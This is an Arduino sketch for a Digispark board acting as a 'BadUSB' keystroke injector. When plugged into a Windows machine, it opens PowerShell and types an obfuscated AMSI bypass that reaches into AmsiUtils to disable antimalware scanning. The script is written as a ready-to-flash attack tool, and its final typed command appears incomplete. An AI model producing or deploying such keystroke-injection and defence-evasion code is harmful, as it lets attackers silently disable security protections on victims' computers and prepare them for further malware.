

#include "DigiKeyboard.h"

void setup() {pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
 
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    
  DigiKeyboard.delay(1000); 
    DigiKeyboard.print("powershell.exe");
    
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(1000); DigiKeyboard.sendKeyStroke(MOD_ALT_RIGHT, KEY_4);
  DigiKeyboard.delay(1000); DigiKeyboard.print("amsi=[Ref].Assembly.GetType('Sys'+'te'+'m.M'+'anage'+'ment.A'+'utom'+'ation.Am'+'siU'+'tils')");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(MOD_ALT_RIGHT, KEY_4); 
  DigiKeyboard.delay(1000); 
  DigiKeyboard.print("field=");
  DigiKeyboard.sendKeyStroke(MOD_ALT_RIGHT, KEY_4); 
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("amsi.GetField('ams'+'iInitF'+'ailed','NonP'+'ublic,S'+'tatic')");
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(1000);  DigiKeyboard.sendKeyStroke(MOD_ALT_RIGHT, KEY_4); 
  DigiKeyboard.delay(1000); 
  DigiKeyboard.print("field.SetValue(");
  DigiKeyboard.sendKeyStroke(MOD_ALT_RIGHT, KEY_4); 
  DigiKeyboard.delay(1000); 
  DigiKeyboard.print("null)");
    
    digitalWrite(1, HIGH); //turn on led when program finishes - You can unplug now
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}
